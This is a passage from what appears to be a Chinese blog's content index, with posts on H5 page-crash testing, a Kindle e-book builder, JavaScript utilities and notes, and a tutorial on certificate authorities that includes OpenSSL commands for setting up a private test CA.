onclick="layer.create(2000)"&gt;创建 2000 个层&lt;/button&gt;&lt;button onclick="layer.create(5000)"&gt;创建 5000 个层&lt;/button&gt;&lt;button onclick="layer.create(10000)"&gt;创建 10000 个层&lt;/button&gt; 实际上，创建多个层，也是对内存的巨大消耗，页面 Crash 可能还是因为内存消耗过大 3. 并发过多问题 测试方法：尝试并发发出多种不同的请求（Fetch请求、XHR 请求、Script/CSS 资源请求），观察页面 Crash 情况 测试地址：http://rawgit.com/barretlee/h5crash/master/demo/crash-request.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;script&gt;var Request = function() &#123; function getType() &#123; return document.querySelector('input:checked').value; &#125;; function getResource() &#123; var type = getType(); var resource = &#123; fetch: '/', xhr: '/', script: '//g.alicdn.com/sd/data_sufei/1.5.1/aplus/index.js', css: '//g.alicdn.com/kg/global-util/1.0.3/index-min.css' &#125;; return resource[type]; &#125;; return &#123; emitOne: function() &#123; var url = getResource() + "?_t=" + (new Date * 1 + Math.random()); switch(getType()) &#123; case 'fetch': return fetch('/'); case 'xhr': with(new XMLHttpRequest) &#123; open('GET', url); send(); &#125; return; case 'script': var s = document.createElement('script'); s.src = url; document.body.appendChild(s); return; case 'css': var s = document.createElement('link'); s.href = url; document.body.appendChild(s); &#125; &#125;, emit: function(num) &#123; [].slice.call(document.querySelectorAll('script,link')).forEach(function(item) &#123; item.parentNode &amp;&amp; item.parentNode.removeChild(item); &#125;); while(num--) &#123; this.emitOne(); &#125; &#125; &#125;&#125;;var request = Request();&lt;/script&gt;&lt;strong&gt;请求类型: &lt;/strong&gt;&lt;ul&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" checked name="type" value="fetch"&gt; &lt;span&gt;使用 Fetch 发送请求&lt;/span&gt;&lt;/label&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" name="type" value="xhr"&gt; &lt;span&gt;使用 XHR 发送请求&lt;/span&gt;&lt;/label&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" name="type" value="script"&gt; &lt;span&gt;并发请求脚本资源&lt;/span&gt;&lt;/label&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" name="type" value="css"&gt; &lt;span&gt;并发请求样式资源&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;&lt;/ul&gt;&lt;button onclick="request.emit(1)"&gt;并发 1 个请求&lt;/button&gt;&lt;button onclick="request.emit(10)"&gt;并发 10 个请求&lt;/button&gt;&lt;button onclick="request.emit(20)"&gt;并发 20 个请求&lt;/button&gt;&lt;button onclick="request.emit(50)"&gt;并发 50 个请求&lt;/button&gt;&lt;button onclick="request.emit(100)"&gt;并发 100 个请求&lt;/button&gt;&lt;button onclick="request.emit(500)"&gt;并发 500 个请求&lt;/button&gt;&lt;button onclick="request.emit(1000)"&gt;并发 1000 个请求&lt;/button&gt; 存在的干扰：设备的种类、设备的 CPU 使用情况和网络状况等。 H5 Crash 测试结果测试结果： 通过 opacity、animation、positon 等方式创建层，即便是 1w 个，页面也没有明显变化；但是使用 transform 创建 2k~5k 个层，页面会卡顿几秒后立即闪退； 内存是条红线，测试发现，一次性消耗 20M 的内存，会导致客户端立即闪退； 并发请求也是存在响应问题的，Fetch API 和 CSS Resource 并发 1k 请求没有出现问题，但是 XHR 和 Script Resource 请求，问题特别明显，虽然没有导致页面闪退，但是页面已经进入了假死状态。 以上临界值还可以继续精确。 小结本文主要是对 H5 Crash 做了一个预研，测试可能存在诸多误差，测试方法也需要改进，不过沿着这些的思路考究会比较容易找到结论。 后续会给出比较有意义的边界数据以及探测工具。]]></content>
      <categories>
        <category>无线技术</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>无线</tag>
        <tag>Crash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kindle 电子书生成工具]]></title>
    <url>%2Fblog%2F2016%2F05%2F20%2F2016-05-20-kindle-book-maker%2F</url>
    <content type="text"><![CDATA[花了两个晚上把 OPF 和 epub 格式整明白了，准备把订阅的 RSS 内容抓取下来做成电子书推到 kindle 中阅读。后续也会把自己博客整成电子书，提供给习惯 kindle 阅读的朋友。研究这些东西目的还是想回到比较纯粹的阅读设备上，毕竟手机屏小干扰多，看久了眼睛也有点不舒服。 本项目旨在写一个 Kindle 电子书的构建工具，从互联网上抓取数据，合并整合都生成一本小巧的 .mobi 电子书。而使用这个工具，你只需要编辑下配置文件，或者直接运行命令行工具。 项目地址：http://github.com/barretlee/kindleBookMaker 基本原理：根据 OPF 规范生成 KF8 格式的 .mobi 电子书 注意： 项目中提供的 /bin/kindlegen 文件只适用于 Mac 系统，如果您使用的是 windows，需要在这里下载对应的 kindleGen，并替换本项目中的文件。 感谢 hillwah 的 PR，帮我添加了对其他平台的支持。 项目结构数据有这么几个来源： 通过抓取单个 uri 的内容，配合 title 和 content DOM 选择器，获取文章的标题和内容 通过抓取 RSS 源获取内容 使用本地数据，比如 hexo build 目录下的 html 文件 下图为该工具的一个结构图： 抓到数据后，工具会帮助分析过滤数据，尤其对 hexo 生成的文件做了特殊的处理，后续也会添加几个扩展功能（比如之间转换 markdown 文件），如果 html 中包含了远程内容——CSS、图片等——程序会全部抓取过来。 最后，使用官方提供了 kindleGen 工具构建，我已经把这个文件放到了 /bin/kindlegen 下，大约 28M，有点大。 使用方法可以下载代码之后，尝试运行下已经提供了一个 DEMO（封面图片就懒得换了，是我自己的头像）： 12345git clone //github.com/barretlee/kindleBookMaker.git;cd kindleBookMaker;npm install;node index;open build/*.mobi; 提供了很多方法可以调用，不过都通过命令行的方式简化了： 从 RSS 源构建： 12node index --rss http://barretlee.com/rss2.xml# node index -r http://barretlee.com/rss2.xml 从单个 URI 构建，-u URL titleQuery ContentQuery FilterRegExp， 其中 titleQuery 为文章标题的 css query，ContentQuery 为文章主要内容的 css query，FilterRegExp 为正则过滤： 12345node index --uri \ http://www.barretlee.com/blog/2016/04/28/mini-query/ \ .post-title \ .post-content \ /&lt;div class="shit-spider"[\s\S]+?&lt;\/div&gt;/ 从本地构建 12node index --dirctory ./src/demo/# node index -d ./src/demo/ 还有另外三个参数： --verbose, -v, 查看 kindle 构建的详细细节，因为编译也可能出错 --help, -h, 帮助说明 -push2kindle, -p, 将构建的 .mobi 文件推送你设定的 kindle 账户上 配置123456789101112131415161718192021222324252627282930313233343536var moment = require('moment');module.exports = &#123; // entry: './src/KF8-Demo', entry: &#123; base: './src/KF8-Demo', list: [] &#125;, bookInfo: &#123; title: "Barret Lee's Personal Website", lang: "zh", creator: "Barret Lee", copyright: "Barret Lee", publisher: "", coverImage: 'coverImage.png' &#125;, /*option*/ output: &#123; base: './build', format: '[name]-' + moment().format('YYYYMMDD') &#125;, /*option for uri*/ singlePage: &#123; title: 'div.title', description: 'div.content', reg: function(data) &#123; return data.replace(/&lt;div class="shit-spider"[\s\S]+?&lt;\/div&gt;/, ''); &#125; &#125;, /*option*/ push2kindle: &#123; email: 'barret.china@gmail.com', password: 'your-email-password', kindle: 'barretlee.com@kindle.cn' &#125;&#125;; entry, 可以为一个 String 或者 Object base, 入口地址，下载的文件都会放在这里 list, list 参数，会影响最后生成的电子书的文章排序 bookInfo, 注意设置 coverImage，它为书籍封面图片 ouput, 可选参数, 默认值为 ./build 和 [name] singlePage, 可选参数, 从 URI 爬取数据时会用到 push2kindle, 可选参数, kindle 参数为你设备对应的推送邮箱, 可以在 这里 设置 Todo 直接从 Markdown 文件生成内容 找到 kindle 帐号偶尔不接受我推送 .mobi 文件的原因，意思就是有的时候推送未成功 参考文献 http://www.idpf.org/epub/30/spec/epub30-publications.html#sec-item-property-values http://www.idpf.org/epub/20/spec/OPF_2.0.1_draft.htm http://www.aliciaramirez.com/2014/05/how-to-make-a-kindle-ebook-from-scratch/]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kindle</tag>
        <tag>kindleGen</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 代码执行效率对比工具]]></title>
    <url>%2Fblog%2F2016%2F04%2F28%2F2016-04-28-javascript-performance-tester%2F</url>
    <content type="text"><![CDATA[平时写些小页面小程序，一般不会出现性能问题，但是在大的工程，或者在写一个框架、类库的时候，代码的性能就需要提高一个优先级了。测试代码的性能有多种方案： 在 http://jsperf.com 上测试 使用 console.time 来收集代码执行的时间 123console.time('Name');// code here...console.timeEnd('Name'); 自己写一个时间控制器 本文自然就是自己撸一个简单易用的测试工具，效果如下图： 设计分析可以先把代码下载下来，跑起来： 123git clone //github.com/barretlee/performance.gitcd performance/test;open index.html; 或者直接打开测试页面：http://barretlee.github.io/performance/test/。 点击代码按钮，Performance 会循环执行 button 中的代码，持续时间是设定的 1000ms，每次执行完，都会计算出相对效率，100% 是效率最高的，剩下的自然就是效率比较低的，从而可以比较清晰地看出程序之间性能差异。 相关阅读 http://share.web-tinker.com/performance.js]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Performance</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[元素选择器 - Mini Query]]></title>
    <url>%2Fblog%2F2016%2F04%2F28%2F2016-04-28-mini-query%2F</url>
    <content type="text"><![CDATA[寥寥几行代码，实现一个简单的元素选择器，兼容低版本 IE。 自 IE8 开始已经开始支持 querySelector 和 querySelectorAll 这两个十分有用的选择器函数，如果不考虑低版本浏览器，它们已经可以基本满足日常需求了。而在兼容低版本浏览器中，可以采用一些 hack 手段。 原理比较简单：通过 CSS Rule 给我们的目标元素添加特殊属性，然后遍历所有元素找到具备特殊属性的元素，当然，找到之后，移除这些特殊属性。 1234567var firstStyleSheet = document.styleSheets[0] || document.createStyleSheet(); firstStyleSheet.addRule(query, 'Barret:Lee');for (var i = 0, len = document.all.length; i &lt; len; i++) &#123; var item = document.all[i]; item.currentStyle.Barret &amp;&amp; res.push(item);&#125;firstStyleSheet.removeRule(0); 比如我们要获取 .box .item a.pink 元素，上面的代码是这么做的, 给所有的 .box .item a.pink 元素添加 { Barret: Lee; } 这个 CSS 的样式 遍历所有元素找到包含 Barret 这个 CSS 属性的元素 移除属性 IE8 有些调皮，需要修复点小问题，源码地址： git clone http://github.com/barretlee/MiniQuery npm install mini-query 代码预览： 12345678910111213141516171819202122232425function $(query) &#123; var res = []; if (document.querySelectorAll) &#123; res = document.querySelectorAll(query); &#125; else &#123; var firstStyleSheet = document.styleSheets[0] || document.createStyleSheet(); query = query.split(','); for(var i = 0, len = query.length; i &lt; len; i++) &#123; firstStyleSheet.addRule(query[i], 'Barret:Lee'); &#125; for (var i = 0, len = document.all.length; i &lt; len; i++) &#123; var item = document.all[i]; item.currentStyle.Barret &amp;&amp; res.push(item); &#125; firstStyleSheet.removeRule(0); &#125; if(res.item) &#123; /* Fuck IE8 */ var ret = []; for(var i = 0, len = res.length; i &lt; len; i++)&#123; ret.push(res.item(i)); &#125; res = ret; &#125; return res;&#125;;]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Mini Query</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[细说 CA 和证书]]></title>
    <url>%2Fblog%2F2016%2F04%2F24%2F2016-04-24-detail-about-ca-and-certs%2F</url>
    <content type="text"><![CDATA[CA，Catificate Authority，它的作用就是提供证书（即服务器证书，由域名、公司信息、序列号和签名信息组成）加强服务端和客户端之间信息交互的安全性，以及证书运维相关服务。任何个体/组织都可以扮演 CA 的角色，只不过难以得到客户端的信任，能够受浏览器默认信任的 CA 大厂商有很多，其中 TOP5 是 Symantec、Comodo、Godaddy、GolbalSign 和 Digicert。 服务器证书分类可以通过两个维度来分类，一个是商业角度，一个是业务角度。 .cert-eg th,.cert-eg td {text-align:center;}.cert-eg .align-left{text-align:left;}.cert-eg br{display: block;} 单域名 多域名 泛域名 多泛域名 DV 支持 不支持 OV 支持 EV 支持 不支持 举例 www.barretlee.com www.barretlee.comwww.xiaohuzige.comwww.barret.cc *.barretlee.com *.barretlee.com*.xiaohuzige.com*.barret.cc 需要强调的是，不论是 DV、OV 还是 EV 证书，其加密效果都是一样的！ 它们的区别在于： DV（Domain Validation），面向个体用户，安全体系相对较弱，验证方式就是向 whois 信息中的邮箱发送邮件，按照邮件内容进行验证即可通过； OV（Organization Validation），面向企业用户，证书在 DV 证书验证的基础上，还需要公司的授权，CA 通过拨打信息库中公司的电话来确认； EV（Extended Validation），打开 Github 的网页，你会看到 URL 地址栏展示了注册公司的信息，这会让用户产生更大的信任，这类证书的申请除了以上两个确认外，还需要公司提供金融机构的开户许可证，要求十分严格。 OV 和 EV 证书相当昂贵，使用方可以为这些颁发出来的证书买保险，一旦 CA 提供的证书出现问题，一张证书的赔偿金可以达到 100w 刀以上。 CA 的作用前文 HTTPS证书生成原理和部署细节 提到如果本地生成公/私钥对和对应未签证的证书，如果使用的证书没有签证，或者未在浏览器受信的 CA 签证，你会看到下图的问题： 上图出现的错误是 net:ERR_CERT_AUTHORITY_INVALID，我们生成证书和公/私钥对的流程都是正确的，但是浏览器不认这张证书，并且提示证书授权不通过；如果通过其他与 Common Name 不同的域名去访问，如我注册的时候使用的 localhost，但是访问的时候用的 127.0.0.1，还会报出这样的错误： 错误码为 net:ERR_CERT_COMMON_NAME_INVALID，意思是 Common Name 不匹配，具体校验流程可以在浏览器的 DevTools 中看到： 从上面几张图，可以大致了解 CA 和证书会做哪些事情，证书由域名、公司信息、序列号和签名信息组成，当我们通过 HTTPS 访问页面时，浏览器会主动验证证书信息是否匹配，也会验证证书是否有效。 CA 有权给所有的域名签发证书，如它可以私自给我的网站签发一张 www.barretlee.com 的证书，并且可以拿着新证书拦截网页流量（当然，前提是这个 CA 是浏览器认证的权威 CA），那我的网站可能就很不安全了，对拥新证书的人来说，我的网站等同于在 HTTP 下进行通讯。 评估 CA 供应商CA 供应商很多，提供服务的侧重点可能也存在一些差异，比如很多 CA 都没有提供证书吊销的服务，这一点对于安全性要求很高的企业来说是完全不能接受的，那么对 CA 供应商的评估需要注意写什么呢？ 1. 内置根 所谓内置根，就是 CA 的根证书内置到各种通用的系统/浏览器中，只有根证书的兼容性够强，它所能覆盖的浏览器才会越多。 2. 安全体系 两个指标可以判断 CA 供应商是否靠谱，一是看价格，价格高自然有它的理由，必然提供了全套的安全保障体系；二是看黑历史，该 CA 供应商有没有爆出过什么漏洞，比如之前的 DigiNotar，被伊朗入侵，签发了 500 多张未授权的证书，结果直接被各系统/浏览器将其根拉入黑名单，毫无疑问公司直接倒闭。 3. 核心功能和扩展功能 这就需要从业务上考虑了，不同的规模的企业、不同的业务对证书的要求不一样，比如证书是否会考虑无 SNI 支持的浏览器问题，是否支持在 reissue 的时候添加域名，是否支持 CAA，是否支持短周期证书等等。 4. 价格 企业完全没必要购买 Github 那样的 EV 证书，太昂贵，而且一般的企业也未必能够申请到这样的证书。供应商很大，价格可以好好评估下，不一定要最贵，最适合的就行。 自建 Root CAOpenSSL 是一个免费开源的库，它提供了构建数字证书的命令行工具，其中一些可以用来自建 Root CA。 很多网站都希望用户知道他们建立的网络通道是安全的，所以会想 CA 机构购买证书来验证 domain，所以我们也可以在很多 HTTPS 的网页地址栏看到一把小绿锁。 然而在一些情况下，我们没必要去 CA 机构购买证书，比如在内网的测试环境中，为了验证 HTTPS 下的一些问题，我们不需要部署昂贵的证书，这个时候自建 Root CA，给自己颁发证书就显得很有价值了。 本节内容较多，主要是代码演示生成证书和验证的过程，可以跳过看下一节，直接看 这里： git clone //github.com/barretlee/autocreate-ca.git 依次执行 install-rootCA.sh、install-intermediateCA.sh 和 install-websiteConfig.sh 首先找到一个放置证书的文件夹，比如 /root/ca 下，下方的测试也在改目录下，如果你要更换其他目录，记得替换下文中的目录地址。 创建 root pair扮演 CA 角色，就意味着要管理大量的 pair 对，而原始的一对 pair 对叫做 root pair，它包含了 root key（ca.key.pen）和 root certificate（ca.cert.pem）。通常情况下，root CA 不会直接为服务器或者客户端签证，它们会先为自己生成几个中间 CA（intermediate CAs），这几个中间 CA 作为 root CA 的代表为服务器和客户端签证。 注意：一定要在绝对安全的环境下创建 root pair，可以断开网络、拔掉网线和网卡，当然，如果是测试玩一玩就不用这么认真了。 设定文件夹结构，并且配置好 openssl 设置： 1234567$ cd /root/ca$ mkdir certs crl newcerts private$ chmod 700 private$ touch index.txt$ echo 1000 &gt; serial$ wget -O /root/ca/openssl.cnf \ //raw.githubusercontent.com/barretlee/autocreate-ca/master/cnf/root-ca 创建 root key，密码可为空，设定权限为只可读： 1234567$ cd /root/ca$ openssl genrsa -aes256 -out private/ca.key.pem 4096Enter pass phrase for ca.key.pem: secretpasswordVerifying - Enter pass phrase for ca.key.pem: secretpassword$ chmod 400 private/ca.key.pem 创建 root cert，权限设置为可读： 12345678910111213141516171819$ cd /root/ca$ openssl req -config openssl.cnf \ -key private/ca.key.pem \ -new -x509 -days 7300 -sha256 -extensions v3_ca \ -out certs/ca.cert.pemEnter pass phrase for ca.key.pem: secretpasswordYou are about to be asked to enter information that will be incorporatedinto your certificate request.-----Country Name (2 letter code) [XX]:CNState or Province Name []:ZhejiangLocality Name []:Organization Name []:Barret LeeOrganizational Unit Name []:Barret Lee Certificate AuthorityCommon Name []:Barret Lee Root CAEmail Address []:$ chmod 444 certs/ca.cert.pem 验证证书： 1$ openssl x509 -noout -text -in certs/ca.cert.pem 正确的输出应该是这样的： 1234567891011121314151617181920212223242526272829Certificate: Data: Version: 3 (0x2) Serial Number: 87:e8:c0:a0:4b:e2:12:5d Signature Algorithm: sha256WithRSAEncryption Issuer: C=CN, ST=Zhejiang, O=Barret Lee, OU=Barret Lee Certificate Authority, CN=Barret Lee Root CA Validity Not Before: Apr 23 05:46:36 2016 GMT Not After : Apr 18 05:46:36 2036 GMT Subject: C=CN, ST=Zhejiang, O=Barret Lee, OU=Barret Lee Certificate Authority, CN=Barret Lee Root CA Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public Key: (4096 bit) Modulus (4096 bit): // ... Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Subject Key Identifier: E5:2D:B8:2B:DC:88:FE:CE:DA:93:D8:6F:2E:74:04:D2:39:E7:C8:03 X509v3 Authority Key Identifier: keyid:E5:2D:B8:2B:DC:88:FE:CE:DA:93:D8:6F:2E:74:04:D2:39:E7:C8:03 X509v3 Basic Constraints: critical CA:TRUE X509v3 Key Usage: critical Digital Signature, Certificate Sign, CRL Sign Signature Algorithm: sha256WithRSAEncryption // ... 包含： 数字签名（Signature Algorithm） 有效时间（Validity） 主体（Issuer） 公钥（Public Key） X509v3 扩展，openssl config 中配置了 v3_ca，所以会生成此项 创建 intermediate pair目前我们已经拥有了 Root Pair，事实上已经可以用于证书的发放了，但是由于根证书很干净，特别容易被污染，所以我们需要创建中间 pair 作为 root pair 的代理，生成过程同上，只是细节略微不一样。 生成目录结构和 openssl 的配置，这里的配置是针对 intermediate pair 的： 123456789$ mkdir /root/ca/intermediate$ cd /root/ca/intermediate$ mkdir certs crl csr newcerts private$ chmod 700 private$ touch index.txt$ echo 1000 &gt; serial$ echo 1000 &gt; /root/ca/intermediate/crlnumber$ wget -O /root/ca/openssl.cnf \ //raw.githubusercontent.com/barretlee/autocreate-ca/master/cnf/intermediate-ca 创建 intermediate key，密码可为空，设定权限为只可读： 12345678$ cd /root/ca$ openssl genrsa -aes256 \ -out intermediate/private/intermediate.key.pem 4096Enter pass phrase for intermediate.key.pem: secretpasswordVerifying - Enter pass phrase for intermediate.key.pem: secretpassword$ chmod 400 intermediate/private/intermediate.key.pem 创建 intermediate cert，设定权限为只可读，这里需要特别注意的一点是 Common Name 不要与 root pair 的一样 ： 12345678910111213141516$ cd /root/ca$ openssl req -config intermediate/openssl.cnf -new -sha256 \ -key intermediate/private/intermediate.key.pem \ -out intermediate/csr/intermediate.csr.pemEnter pass phrase for intermediate.key.pem: secretpasswordYou are about to be asked to enter information that will be incorporatedinto your certificate request.-----Country Name (2 letter code) [XX]:CNState or Province Name []:ZhejiangLocality Name []:Organization Name []:Barret LeeOrganizational Unit Name []:Barret Lee Certificate AuthorityCommon Name []:Barret Lee Intermediate CAEmail Address []: 使用 v3_intermediate_ca 扩展签名，密码可为空，中间 pair 的有效时间一定要为 root pair 的子集： 12345678910$ cd /root/ca$ openssl ca -config openssl.cnf -extensions v3_intermediate_ca \ -days 3650 -notext -md sha256 \ -in intermediate/csr/intermediate.csr.pem \ -out intermediate/certs/intermediate.cert.pemEnter pass phrase for ca.key.pem: secretpasswordSign the certificate? [y/n]: y$ chmod 444 intermediate/certs/intermediate.cert.pem 此时 root 的 index.txt 中将会多出这么一条记录： 1V 260421055318Z 1000 unknown .../CN=Barret Lee Intermediate CA 验证中间 pair 的正确性： 123456$ openssl x509 -noout -text \ -in intermediate/certs/intermediate.cert.pem$ openssl verify -CAfile certs/ca.cert.pem \ intermediate/certs/intermediate.cert.pemintermediate.cert.pem: OK 浏览器在验证中间证书的时候，同时也会去验证它的上一级证书是否靠谱，创建证书链，将 root cert 和 intermediate cert 合并到一起，可以让浏览器一并验证： 123$ cat intermediate/certs/intermediate.cert.pem \ certs/ca.cert.pem &gt; intermediate/certs/ca-chain.cert.pem$ chmod 444 intermediate/certs/ca-chain.cert.pem 创建服务器/客户端证书终于到了这一步，生成我们服务器上需要部署的内容，上面已经解释了为啥需要创建中间证书。root pair 和 intermediate pair 使用的都是 4096 位的加密方式，一般情况下服务器/客户端证书的过期时间为一年，所以可以安全地使用 2048 位的加密方式。 1234$ cd /root/ca$ openssl genrsa -aes256 \ -out intermediate/private/www.barretlee.com.key.pem 2048$ chmod 400 intermediate/private/www.barretlee.com.key.pem 创建 www.barretlee.com 的证书： 12345678910111213141516$ cd /root/ca$ openssl req -config intermediate/openssl.cnf \ -key intermediate/private/www.barretlee.com.key.pem \ -new -sha256 -out intermediate/csr/www.barretlee.com.csr.pemEnter pass phrase for www.barretlee.com.key.pem: secretpasswordYou are about to be asked to enter information that will be incorporatedinto your certificate request.-----Country Name (2 letter code) [XX]:CNState or Province Name []:ZhejiangLocality Name []:HangzhouOrganization Name []:Barret LeeOrganizational Unit Name []:Barret Lee's Personal WebsiteCommon Name []:www.barretlee.comEmail Address []:barret.china@gmail.com 使用 intermediate pair 签证上面证书： 123456$ cd /root/ca$ openssl ca -config intermediate/openssl.cnf \ -extensions server_cert -days 375 -notext -md sha256 \ -in intermediate/csr/www.barretlee.com.csr.pem \ -out intermediate/certs/www.barretlee.com.cert.pem$ chmod 444 intermediate/certs/www.barretlee.com.cert.pem 可以看到 /root/ca/intermediate/index.txt 中多了一条记录： 1V 170503055941Z 1000 unknown .../emailAddress=barret.china@gmail.com 验证证书： 123456$ openssl x509 -noout -text \ -in intermediate/certs/www.barretlee.com.cert.pem$ openssl verify -CAfile intermediate/certs/ca-chain.cert.pem \ intermediate/certs/www.barretlee.com.cert.pemwww.barretlee.com.cert.pem: OK 此时我们已经拿到了几个用于部署的文件： ca-chain.cert.pem www.barretlee.com.key.pem www.barretlee.com.cert.pem 添加信任 CA 和证书的调试双击 /root/ca/intermediate/certs/ca-chain.cert.pem 将证书安装到系统中，目的是让本机信任这个 CA，将其当作一个权威 CA，安装 root pem 或者 intermediate chain pem 都是可以的，它们都具备验证能力。如果不执行这一步，浏览器依然会提示 net:ERR_CERT_AUTHORITY_INVALID。 上面申请测试证书时，我设置的 Common Name 为 www.barretlee.com，由于不在线上机器测试，可以将其添加到 hosts： 1127.0.0.1 www.barretlee.com 执行下方测试代码： 12345678910111213141516// https-server.jsvar https = require('https');var fs = require('fs');var options = &#123; key: fs.readFileSync('/root/ca/intermediate/private/www.barretlee.com.key.pem'), cert: fs.readFileSync('/root/ca/intermediate/certs/www.barretlee.com.cert.pem'), passphrase: 'passoword' // 如果生成证书的时候设置了密码，请添加改参数和密码&#125;;https.createServer(options, function(req, res) &#123; res.writeHead(200); res.end('hello world');&#125;).listen(8000, function()&#123; console.log('Open URL: //www.barretlee.com:8000');&#125;); 可以看到这样的效果： 查看证书的详细信息： 回到最初的问题： 然而在一些情况下，我们没必要去 CA 机构购买证书，比如在内网的测试环境中，为了验证 HTTPS 下的一些问题，我们不需要部署昂贵的证书，这个时候自建 Root CA，给自己颁发证书就显得很有价值了。 一般公司内网的电脑都会强制安装一些安全证书，此时就可以把我们自建自签名的证书导入/引导安装到用户的电脑中啦~ 无 SNI 支持问题很多公司由于业务众多，域名也是相当多的，为了方便运维，会让很多域名指向同样的 ip，然后统一将流量/请求分发到后端，此时就会面临一个问题：由于 TLS/SSL 在 HTTP 层之下，客户端和服务器握手的时候还拿不到 origin 字段，所以服务器不知道这个请求是从哪个域名过来的，而服务器这边每个域名都对应着一个证书，服务器就不知道该返回哪个证书啦。 SNI 就是用来解决这个问题的，官方解释是 SNI（Server Name Indication）是为了解决一个服务器使用多个域名和证书的SSL/TLS扩展。一句话简述它的工作原理就是，在连接到服务器建立SSL链接之前先发送要访问站点的域名（Hostname），这样服务器根据这个域名返回一个合适的证书。 然后有将近 25% 的浏览器不支持该字段的扩展，这个问题有两个通用解决方案： 使用 VIP 服务器，每个域名对应一个 VIP，然后 VIP 与统一接入服务对接，通过 ip 来分发证书，不过运维成本很高，可能也需要大量的 VIP 服务器 采用多泛域名，将多个泛域名证书打包进一个证书，可以看看 淘宝 页面的证书它的缺点是每次添加域名都需要更新证书。 几个细节知识点1. 证书选择 证书有多张加密方式，不同的加密方式对 CPU 计算的损耗不同，安全级别也不同。TLS 在进行第一次握手的时候，客户端会向服务器端 say hello，这个时候会告诉服务器，它支持哪些算法，此时服务器可以将最适合的证书发给客户端。 2. 证书的吊销 CA 证书的吊销存在两种机制，一种是在线检查，client 端向 CA 机构发送请求检查 server 公钥的靠谱性；第二种是 client 端储存一份 CA 提供的证书吊销列表，定期更新。前者要求查询服务器具备良好性能，后者要求每次更新提供下次更新的时间，一般时差在几天。安全性要求高的网站建议采用第一种方案。 大部分 CA 并不会提供吊销机制（CRL/OCSP），靠谱的方案是为根证书提供中间证书，一旦中间证书的私钥泄漏或者证书过期，可以直接吊销中间证书并给用户颁发新的证书。中间证书的签证原理于上上条提到的原理一样，中间证书还可以产生下一级中间证书，多级证书可以减少根证书的管理负担。 很多 CA 的 OCSP Server 在国外，在线验证时间比较长，如果可以联系 CA 供应商将 Server 转移到国内，效率可以提升 10 倍左右。 3. PKI 体系 比较主流的两种方案是 HPKP 和 Certificate Transparency： HPKP 就是用户第一次访问的时候记下 sign 信息，以后不匹配则拒绝访问，这存在很大的隐患，比如 Server 更新了证书，或者用户第一次访问的时候就被人给黑了 Certificate Transparency 意思就是让 CA 供应商透明化 CA 服务日志，防止 CA 供应商偷偷签证 小结看了不少文章，对 CA 和证书相关的知识做了一些总结，可能不全面，也可能存在表述错误或者知识性错误，欢迎拍砖！ 拓展阅读 http://jamielinux.com/docs/openssl-certificate-authority/index.html http://www.ert7.com/service/knowledge/3999.html]]></content>
      <categories>
        <category>网络交互</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Catificate Authority</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 被忽视的细节]]></title>
    <url>%2Fblog%2F2016%2F04%2F18%2F2016-04-18-javascript-detail%2F</url>
    <content type="text"><![CDATA[《JavaScript 权威指南》这本书从第四版开始，一直到第六版，每个版本我都逐字逐句读过几遍，然而每一遍下来的感受却完全不一样。上上周的周一，再次翻开了这本犀牛书，这一次我是带着批判精神和研究精神过来的，所以看的时候也写下了一些感受和笔记，都是些容易被忽略的点，部分内容犀牛书上不一定有提到。 之前都发在 微博 上，稍微整理了一番，放在这里，方便阅读。 一些小点语句/表达式 换个角度理解语句（statemaents）和表达式（expressions）：表达式不会改变程序的运行状态，而语句会。还有一种叫做表达式语句，可以理解为表达式和语句的交集，如 ({a:1})、&quot;use strict;&quot;等，我觉得没必要死扣，意义不大。 字符集 ES3 要求 JS 必须实现 Unicode 2.1 及后续版本，而 ES5 只要求支持 Unicode 3 及后续版本。Unicode 字符 2005 年超过了十万字符，至今仍在不断增修，最新版本是 8.0。 分号 如果你写 JS 代码不喜欢带分号，而又搞不清什么时候必须加分号，可以这么做：在以 “(“、”[“ 、”/“、”+”、”-“ 开头的语句前面都加上一个分号，如 ;(a + b).toString()。 进制 ES5 严格模式中禁止使用八进制。目前各种引擎对 JS 的实现是存在差异的，部分支持八进制，部分不支持。八进制被禁止的原因：String 和 Number 之间经常被相互转换，而以 0 开头的八进制数据特别容易让人迷惑，也容易让机器迷惑，比如 09 是该被转换成 9 还是直接报错？十六进制不存在这个问题，如 0x98。更多信息参阅 这里。 精度 JS 采用 IEEE-754 浮点数表示法，这是一种二进制表示法，由于精度原因 JS 不能表示所有的实数。它能展示的浮点数个数是有限的，比如它不能准确地表示三分之一的数值字面量。这也导致了它在浮点数的计算上存在误差，如 0.3-0.2 != 0.2-0.1，因为在计算的过程中，存在数据的溢出，丢失了精度。 null/undefined 系统级、出乎意料的或者类似错误的值的空缺使用 undefined，而程序级、正常的或意料之中的值的空缺使用 null。平时编程给变量赋值时，不要使用 undefined 而应该用 null。值得注意的是 ES3 中的 undefined 是可以被重新赋值的，ES5 修复了这个 bug。通常我们使用 void 0 来还原/代替 undefined 的值。 eval eval 是个不好把握的东西，它在 ES3 中更像是 Function，而在 ES5 中更像是一个运算符（严格模式下不允许设置别名，否则报错，且将其作为保留字）。实际上 ES3 中也不允许给 eval 设置别名，然而很多实现却依然允许，并将其作为全局代码来执行，浏览器尤其是 IE 对它实现相当混乱，没有什么规律可循，不过 IE 中提供了一个 execScript 函数，类似全局的 eval，这个函数每次执行都会返回 null。 